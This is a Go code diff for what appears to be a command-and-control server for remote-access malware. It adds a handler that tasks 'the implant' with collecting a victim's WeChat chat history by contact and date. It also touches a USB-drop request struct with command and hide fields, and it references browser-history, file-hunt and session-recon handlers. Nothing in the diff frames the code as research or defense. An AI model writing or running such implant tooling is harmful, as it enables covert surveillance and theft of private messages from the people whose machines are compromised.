@@ -1,6 +1,7 @@
 package server
 
 import (
+	"encoding/json"
 	"fmt"
 	"log/slog"
 	"net/http"
@@ -21,10 +22,10 @@ type fileHuntRequest struct {
 }
 
 type usbDropRequest struct {
-	Path   string `json:"path" form:"path"`
-	Dest   string `json:"dest" form:"dest"`
+	Path    string `json:"path" form:"path"`
+	Dest    string `json:"dest" form:"dest"`
 	Command string `json:"command" form:"command"`
-	Hide   bool   `json:"hide" form:"hide"`
+	Hide    bool   `json:"hide" form:"hide"`
 }
 
 type screenTriggerRequest struct {
@@ -186,6 +187,51 @@ func (s *Server) handleBrowserHistory(c *gin.Context) {
 		return
 	}
 	s.dispatchTask(c, task, "browser_history", "Browser history: "+browser)
+}
+
+// wechatHistoryRequest represents the request parameters for wechat_history task
+type wechatHistoryRequest struct {
+	Filter    string `json:"filter" form:"filter"`         // 可选：all / 关键词
+	Contact   string `json:"contact" form:"contact"`       // 可选：联系人名称/wxid/备注
+	StartTime string `json:"start_time" form:"start_time"` // 可选：开始时间 RFC3339
+	EndTime   string `json:"end_time" form:"end_time"`     // 可选：结束时间 RFC3339
+}
+
+// handleWeChatHistory dispatches a wechat_history task to the agent
+func (s *Server) handleWeChatHistory(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+	id := c.Param("id")
+	var req wechatHistoryRequest
+	bindJSONOrForm(c, &req)
+
+	filter := strings.TrimSpace(req.Filter)
+	if filter == "" {
+		filter = strings.TrimSpace(req.Contact)
+	}
+	if filter == "" {
+		filter = "all"
+	}
+
+	// Build filter JSON for the implant. Marshal instead of string formatting
+	// so contact keywords containing quotes/backslashes stay valid JSON.
+	filterPayload, err := json.Marshal(wechatHistoryRequest{
+		Filter:    filter,
+		Contact:   req.Contact,
+		StartTime: req.StartTime,
+		EndTime:   req.EndTime,
+	})
+	if err != nil {
+		respondError(c, http.StatusInternalServerError, "failed to encode wechat filter")
+		return
+	}
+
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "wechat_history", Command: string(filterPayload)})
+	if task == nil {
+		return
+	}
+	s.dispatchTask(c, task, "wechat_history", "WeChat history: "+filter)
 }
 
 func (s *Server) handleSessionRecon(c *gin.Context) {
